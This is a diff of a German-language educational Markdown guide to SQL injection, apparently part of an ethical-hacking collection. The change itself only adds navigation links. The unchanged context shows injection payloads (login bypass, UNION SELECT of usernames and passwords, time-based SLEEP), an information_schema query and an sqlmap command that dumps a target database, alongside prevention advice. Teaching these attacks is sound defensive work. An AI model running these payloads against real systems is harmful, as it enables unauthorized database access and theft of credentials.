@@ -15,10 +15,26 @@
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Was ist eine SQL-Injection?
 
 **SQL-Injection** (SQLi) ist eine Schwachstelle in Webanwendungen, bei der Angreifer schädlichen SQL-Code einschleusen, um mit der Datenbank zu interagieren. Ziel ist es, Daten zu lesen, ändern oder löschen, ohne Berechtigung zu haben.
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Grundlegende Arten von SQL-Injections
@@ -48,17 +64,44 @@
 admin' --
 ```
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### 2. Union-Based
 
 ```sql
 ' UNION SELECT null, username, password FROM users --
 ```
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### 3. Time-Based (MySQL)
 
 ```sql
 ' OR IF(1=1, SLEEP(5), 0) --
 ```
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### 4. Blind SQLi (Boolean)
 
@@ -93,6 +136,12 @@ SELECT table_name FROM information_schema.tables WHERE table_schema=database();
 
 
 
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 ## Schutz vor SQL-Injection
 
 * ✅ Prepared Statements / Parameterized Queries verwenden (z. B. `PDO`, `mysqli` in PHP)
@@ -120,6 +169,12 @@ SELECT table_name FROM information_schema.tables WHERE table_schema=database();
 
 
 
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 ## Beispiel: SQL-Injection mit sqlmap
 
 ```bash
@@ -134,6 +189,12 @@ sqlmap -u "http://target.com/login.php" --data="user=admin&pass=admin" --dump
 
 
 
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 ## Fazit
 
 SQL-Injections sind eine der ältesten, aber immer noch häufigsten Sicherheitslücken im Web. Mit ausreichendem Wissen und den richtigen Tools lassen sich diese erkennen, ausnutzen und vor allem vermeiden.
@@ -141,6 +202,12 @@ SQL-Injections sind eine der ältesten, aber immer noch häufigsten Sicherheitsl
 **Ziel:** Erkennen, verstehen und absichern.
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 ## Haftungsausschluss
 
@@ -154,12 +221,6 @@ Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und
 [Disclaimer](/00-disclaimer/disclaimer.md)
 
 --- 
-
-<div align=right>
-
-[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
-
-</div>
 
 Stay curious – stay secure. 🔐
 
